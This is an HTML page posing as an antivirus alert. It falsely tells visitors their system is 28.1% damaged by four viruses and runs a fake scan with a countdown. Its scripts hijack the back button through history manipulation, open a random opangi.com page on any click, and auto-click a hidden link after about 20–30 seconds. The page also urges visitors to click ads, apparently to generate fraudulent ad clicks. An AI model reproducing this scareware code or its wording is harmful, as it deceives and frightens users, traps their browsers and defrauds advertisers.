<!DOCTYPE html>
<html>
<head>
<meta name='robots' content='noindex,nofollow'>
<meta name='googlebot' content='noindex,nofollow'>
<meta http-equiv='Content-Type' content='text/html; charset=UTF-8'>
<meta name='viewport' content='user-scalable=no, initial-scale=1.0, maximum-scale=1.0, width=device-width'>
<meta name='theme-color' content='#ff0000'>
<title>Anti-virus defense</title>
<style type='text/css'>
li {list-style-type: none;margin: 0px;}
#main {display:none;}
html,body{margin:0;padding:0;background-color:#ce3426}
a,a:visited,a:hover{color:#fff}
p{margin:0;padding:8px 0}
input{border:1px solid #fff;float:left;margin:0 10px 0 0}
#wrap{width:90%;max-width:600px;margin:auto;padding-top:10px;padding-bottom:20px;color:#fff;font-family:'Roboto',sans-serif;font-size:14px;font-weight:lighter}
.small{font-size:12px}
.big{font-size:20px}
.text-center{text-align:center}
.button a,.button a:visited,.button a:hover{display:block;background-color:#d45246;color:#fff;padding:10px;text-decoration:none;border-radius:2px;width:200px;margin:auto}
.asd {
	background-color: #000000;
	padding: 5px;
	height: 600px;
	width: 800px;
	margin-top: 10px;
	margin-right: 10px;
	margin-bottom: 10px;
}
</style>

<script> 
var strUrl = window.location.href;
</script> 

<script> 
var says = [
    'https://www.opangi.com/GameReviews.html',
    'https://www.opangi.com/GameNews.html',
    'https://opangi.com/game.html',
    'https://www.opangi.com/GameTips.html',
    'https://www.opangi.com/index.html',
    'https://www.opangi.com/about-us.html',
    'https://www.opangi.com/contact-us.html',
    'https://www.opangi.com/privacy-policy.html'
];
var timer = null;
var say = document.getElementById('say');

function getrand() {
    var ran = Math.floor(Math.random() * says.length);
    return says[ran];
}
</script> 

<script type="text/javascript">
window.history.pushState(''+(getrand('say')), 'Other Page', ''+(getrand('say')));
window.history.pushState(''+strUrl, 'Initial Page', ''+strUrl);
</script>

<script type="text/javascript">
window.addEventListener("popstate", function(e) {
    if (document.URL.indexOf(""+(getrand('say'))) >= 0) {
        document.location.href = document.location;
    }
});
</script>

<script> 
var count = 120;
var counter = setInterval(timer, 1000);

function timer() {
    count = count - 1;
    if (count <= 0) {
        clearInterval(counter); 
        return;
    }
    document.getElementById('timer').innerHTML = count + ' 秒'; 
}
</script>

<script type="text/javascript">
function GetRandomNum(Min, Max) {
    var Range = Max - Min;   
    var Rand = Math.random();   
    return (Min + Math.round(Rand * Range));   
}   

var mytime = GetRandomNum(20000, 30000); 

function myclick() {
    document.getElementById("clickMe").click();
}

function autoclick() {
    setTimeout("myclick()", mytime);
}
</script>

<script type="text/javascript" src='/php/js-canshu.js'></script>

<script type='text/javascript'>
var id = Math.round(Math.random() * 3390) + 180;

function launchpopLink() {
    document.location.assign;
    window.open('http://www.opangi.com/html/' + id + '.html', '_blank');
}
</script>

</head>

<body style='display: block;' onclick='launchpopLink();' onload='autoclick(); scan();'>
    <div id='wrap'>
        <p><img src='/php/error.png' style='width:50px'></p>
        <p class='big'>Your system is heavily damaged by Four virus!</p>
        <p>We detect that your system is 28.1% DAMAGED because of four harmful viruses from recent adult sites. Soon it will damage your system applications and data etc.</p>
        <p>If you do not remove the virus now, it will cause severe damage to your system. Here's what you NEED to do (step by step):</p>
        <p><strong>Step 1:</strong> Click the link or picture below in the black box. Do not close it immediately (the system will check whether your browser's function is normal)</p>
        <p><strong>Step 2:</strong> Please wait for 2 minutes, the system will check the malicious code for you and clear the virus.</p>
        <p style='text-align: center;'> In testing...Remaining <span id='timer'>120 Second</span> </p> 

        <table style='border:1px solid #fff;margin:15px auto;border-collapse:collapse;'>
            <tr style='padding:10px;'>
                <td width='80%' style='padding:0;'>
                    <div style='width:220px; height:24px;position:relative;'>
                        <div id='progress1' style='height:24px; width:0px; background-color:#22afc2;position:absolute;'></div>
                        <div style='position:absolute;z-index:999;color:#000;padding:2px;text-align:left;width:220px;' id='status'>Scanning.. Browser kernel</div>
                    </div>
                </td>
                <td width='20%' style='background-color:#FF0000;text-align:center;color:#000;' id='s3'>
                    <div id='percentage'>15%</div>
                </td>
            </tr>
        </table>

        <div class='asd' id='showads'>
            <p>To check whether your browser is working properly, please click on any of the links or pictures below.</p>
            <div id='userad1'>
                <!-- <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-1233302309770573"
     crossorigin="anonymous"></script>
<!-- 250*250 -->
<ins class="adsbygoogle"
     style="display:inline-block;width:250px;height:250px"
     data-ad-client="ca-pub-1233302309770573"
     data-ad-slot="2207609981"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
 -->
            </div>
            <div id='userad2'>
                <!-- <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-1233302309770573"
     crossorigin="anonymous"></script>
<!-- 2502501 -->
<ins class="adsbygoogle"
     style="display:inline-block;width:250px;height:250px"
     data-ad-client="ca-pub-1233302309770573"
     data-ad-slot="8932628990"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script> -->
            </div>
            <div id='userad3'>
                <!-- <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-1233302309770573"
     crossorigin="anonymous"></script>
<!-- 460x60 -->
<ins class="adsbygoogle"
     style="display:inline-block;width:460px;height:60px"
     data-ad-client="ca-pub-1233302309770573"
     data-ad-slot="4067315127"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
 -->
            </div>
        </div>

        <p class='small'>
            <input type='checkbox'> 
            Internet anti-virus <a href='#' target='_blank'>Privacy Policy</a>.
        </p>
        <script type='text/javascript'>
            var id = Math.round(Math.random() * 3390) + 180;
            document.write("<a href=http://www.opangi.com/html/" + id + ".html id=clickMe>Emergency treatment</a>")
        </script> 
        <a href='#' target='_blank'>SOS for help</a> 
        <a href='#' target='_blank'>Inspection center</a> 
        <a href='#' target='_blank'>main certification and alliances</a>
    </div>
</body>
</html>
